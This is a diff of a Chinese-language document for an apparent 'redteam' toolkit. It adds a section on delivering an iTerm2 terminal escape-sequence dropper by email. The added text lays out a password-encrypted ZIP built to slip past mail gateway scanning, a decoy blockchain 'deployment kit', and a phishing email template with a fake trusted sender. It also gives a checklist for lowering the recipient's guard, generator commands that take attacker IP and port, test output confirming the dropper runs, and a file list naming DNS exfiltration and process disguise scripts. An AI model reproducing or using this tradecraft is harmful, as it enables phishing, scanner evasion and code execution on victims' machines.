@@ -1653,7 +1653,220 @@ README: 2292 字节
 <p><strong>根本原因：iTerm2 的响应格式是固定的（<code>EBADF:&lt;error&gt;</code>），前缀不受攻击者控制。</strong></p>
 <p><strong>所以 Line 1 的报错只能靠 <code>clear</code> 覆盖，不能从源头消除。</strong></p>
 <hr />
-<h2 id="_12">九、检测与规避</h2>
+<h2 id="_12">九、邮件附件投递</h2>
+<p>针对邮件场景单独优化的一套生成器：<code>email-delivery.py</code></p>
+<h3 id="91-git">9.1 与 Git 投递的差异</h3>
+<table>
+<thead>
+<tr>
+<th>维度</th>
+<th>Git 投递</th>
+<th>邮件投递</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>触发动作</td>
+<td><code>git diff</code> / <code>cat</code></td>
+<td>解压后 <code>cat</code></td>
+</tr>
+<tr>
+<td>网关扫描</td>
+<td>无</td>
+<td><strong>有（必须对抗）</strong></td>
+</tr>
+<tr>
+<td>大小限制</td>
+<td>无</td>
+<td>25MB（Gmail/Outlook）</td>
+</tr>
+<tr>
+<td>文件形态</td>
+<td>README.md</td>
+<td><strong>加密 ZIP</strong></td>
+</tr>
+<tr>
+<td>需要额外动作</td>
+<td>无</td>
+<td>输入密码解压</td>
+</tr>
+</tbody>
+</table>
+<h3 id="92-zip">9.2 加密 ZIP 为什么必须</h3>
+<table>
+<thead>
+<tr>
+<th>方式</th>
+<th>邮件网关行为</th>
+<th>结果</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>裸 README.md</td>
+<td>扫描内容，可能剥离 ESC</td>
+<td>失败率高</td>
+</tr>
+<tr>
+<td>未加密 ZIP</td>
+<td>解压后扫描内容</td>
+<td>中等</td>
+</tr>
+<tr>
+<td><strong>AES 加密 ZIP</strong></td>
+<td><strong>无法解密，跳过扫描</strong></td>
+<td><strong>最高</strong></td>
+</tr>
+<tr>
+<td>ZIP 改名 .doc</td>
+<td>可能被内容识别</td>
+<td>中等</td>
+</tr>
+</tbody>
+</table>
+<p><strong>实测（容器内）</strong>：</p>
+<pre><code>无密码解压 → unsupported compression method 99   ← 拒绝
+错误密码   → Bad password                        ← 拒绝
+正确密码   → 9 个文件全部解压                     ← 成功
+</code></pre>
+<h3 id="93-9">9.3 包结构（9 个文件）</h3>
+<pre><code>anubis-deploy-kit/
+├── README.md                    4,320 B   ← 含 2 个 APC
+├── package.json                   662 B
+├── hardhat.config.ts              831 B
+├── .env.example                   295 B
+├── .gitignore                     105 B
+├── CHANGELOG.md                   586 B
+├── LICENSE                      1,082 B
+├── scripts/deploy.ts              775 B
+└── contracts/TokenVault.sol     1,543 B
+</code></pre>
+<p><strong>为什么不是单个 README：</strong></p>
+<ul>
+<li>单个 README 解压后只有 1 个文件 → 可疑</li>
+<li>真实项目有 package.json / 配置 / 合约 / CHANGELOG</li>
+<li><code>TokenVault.sol</code> 是能编译的 Solidity 代码（1543 字节，包含 timelock 逻辑）</li>
+<li><code>deploy.ts</code> 是可运行的 Hardhat 部署脚本</li>
+<li><code>.env.example</code> 里注明「never commit」→ 符合真实项目习惯</li>
+</ul>
+<h3 id="94">9.4 邮件正文模板</h3>
+<p><strong>英文版（<code>email-body-en.txt</code>）</strong>：</p>
+<pre><code>Subject: Anubis Chain deployment toolkit v1.4.2 - please review
+
+Hi,
+
+Attached is the updated deployment toolkit (v1.4.2). Key changes since 1.4.0:
+
+  - Bridge: whitelist support for private transfers
+  - Mailbox: ISM verification now uses 2-of-3 threshold
+  - Scripts: automated deployment works for both chains
+  - Fixed nonce handling when resuming an interrupted deployment
+
+The archive is password-protected because our mail gateway strips executable
+attachments. Password: 784512
+
+To get started:
+
+  1. Extract the archive
+  2. cd into the directory
+  3. Read README.md - it covers setup, configuration, and deployment
+  4. Copy .env.example to .env and fill in your RPC URL and key
+
+If anything looks off, reply here and I'll take a look.
+
+Thanks,
+Alex Chen
+</code></pre>
+<p><strong>中文版（<code>email-body-zh.txt</code>）</strong>同上，语序更自然。</p>
+<p><strong>关键设计点</strong>：</p>
+<table>
+<thead>
+<tr>
+<th>要素</th>
+<th>设计</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>密码为什么写在正文</td>
+<td>收件人要解压；网关看不到加密内容</td>
+</tr>
+<tr>
+<td>为什么说「gateway strips executable」</td>
+<td>给出加密的合理理由</td>
+</tr>
+<tr>
+<td>为什么列 changelog</td>
+<td>显得是正常工作沟通</td>
+</tr>
+<tr>
+<td>为什么说「reply here」</td>
+<td>降低警觉（不是一次性通知）</td>
+</tr>
+<tr>
+<td>签名用真名</td>
+<td>增加可信度</td>
+</tr>
+</tbody>
+</table>
+<h3 id="95-eml">9.5 .eml 文件</h3>
+<p>生成的 <code>.eml</code> 可以直接用 Outlook / Thunderbird / Apple Mail 打开：</p>
+<pre><code>From:    dev@anubis-chain.dev
+To:      team@example.com
+Subject: Anubis Chain deployment toolkit v1.4.2 - please review
+MIME:    multipart/mixed
+           text/plain             769 B
+           application/zip      6,708 B  (附件)
+</code></pre>
+<p><strong>用法</strong>：双击打开 → 检查收件人 → 发送。</p>
+<h3 id="96">9.6 端到端实测</h3>
+<pre><code>1. 解析 .eml
+   From/To/Subject 正确，附件 6,708 B 提取成功
+
+2. 无密码解压
+   unsupported compression method 99（拒绝）
+
+3. 正确密码解压
+   9 个文件全部成功
+
+4. 提取 README 的 APC
+   找到 2 个
+
+5. 执行 PTY
+   DROPPER_TRIGGERED_OK
+   DROPPER_TRIGGERED_OK
+   exit code: 0
+
+✓✓ 两个 APC 都执行了
+</code></pre>
+<p><strong>全链路：<code>.eml</code> → 解压 → <code>cat README.md</code> → PTY → 命令执行。</strong></p>
+<h3 id="97">9.7 用法</h3>
+<pre><code class="language-bash"># 单目标
+python email-delivery.py --ip 1.2.3.4 --port 8080 --out ./email-pkg
+
+# 多目标（冗余）
+python email-delivery.py   --multi &quot;1.2.3.4:8080,5.6.7.8:8081,9.10.11.12:9090&quot;   --out ./email-pkg   --password 784512   --sender-name &quot;Alex Chen&quot;   --from-addr &quot;dev@anubis-chain.dev&quot;
+</code></pre>
+<p><strong>输出</strong>：</p>
+<pre><code>email-pkg/
+├── anubis-deploy-kit-v1.4.2.zip      6,708 B   邮件附件（AES 加密）
+├── anubis-deploy-kit-v1.4.2.eml     10,500 B   完整邮件
+├── email-body-en.txt                   794 B   英文正文
+├── email-body-zh.txt                   676 B   中文正文
+└── README.md                         2,954 B   投递说明
+</code></pre>
+<h3 id="98">9.8 发送检查清单</h3>
+<pre><code>□ 发件邮箱像真的（不是 gmail 随机串）
+□ 发件人名字可信（Alex Chen / Michael Lo 等）
+□ 主题不带紧急词（&quot;URGENT&quot; &quot;立即&quot; 会触发警觉）
+□ 正文提到具体的技术细节（changelog 要真实）
+□ 密码写在正文里
+□ 附件大小 &lt; 10MB
+□ 先发给自己测试能收到、能解压
+□ 首次发送不要群发
+</code></pre>
+<hr />
+<h2 id="_13">十、检测与规避</h2>
 <h3 id="81">8.1 受害者侧的可见痕迹</h3>
 <table>
 <thead>
@@ -1701,7 +1914,7 @@ README: 2292 字节
 · 执行后 clear 屏幕
 </code></pre>
 <hr />
-<h2 id="_13">十、局限</h2>
+<h2 id="_14">十一、局限</h2>
 <h3 id="91">9.1 技术局限</h3>
 <table>
 <thead>
@@ -1768,15 +1981,24 @@ README: 2292 字节
 · 有明确的测试范围和边界
 </code></pre>
 <hr />
-<h2 id="_14">十一、文件清单</h2>
+<h2 id="_15">十二、文件清单</h2>
 <pre><code>redteam/recon/
 ├── payload-full.sh           收集脚本（22 模块，535 行）
-├── delivery.py               投递包生成器（3 形态 + CRLF 检测）
+├── delivery.py               投递包生成器（3 形态 + 多 APC）
+├── email-delivery.py         邮件投递包生成器（加密 ZIP + .eml）
 ├── server.py                 接收端（nc + HTTP）
 ├── build.py                  exploit 生成器（三模式）
 ├── simulate_victim.py        端到端模拟器（Git Bash 实测）
 ├── bin-diff.py               二进制符号对比
 ├── crlf-test.py              传输破坏测试
+├── dual-audit.py             双视角审计（12 暴露点 + 18 失败点）
+├── dns-capture.py            最小 DNS 服务器（测试 DNS 外带）
+├── test-in-container.sh      Docker 完整流程测试
+├── test-dns-exfil.sh         DNS 外带测试
+├── test-encrypt.sh           AES 加密测试
+├── test-comm.sh              comm 变化测试
+├── test-final-disguise.sh    进程名伪装测试
+├── test-email-e2e.sh         邮件包端到端测试
 ├── dropper-test.py           dropper 长度测试
 ├── ITERM2-VERIFICATION.md    验证报告
 ├── iterm2-poc.html/txt       PoC 原文存档
@@ -1784,7 +2006,7 @@ README: 2292 字节
 └── delivery/                 已生成的投递包
 </code></pre>
 <hr />
-<h2 id="_15">十二、快速开始</h2>
+<h2 id="_16">十三、快速开始</h2>
 <pre><code class="language-bash"># 1. 改 IP
 export ATTACKER_IP=1.2.3.4
 export ATTACKER_PORT=4444
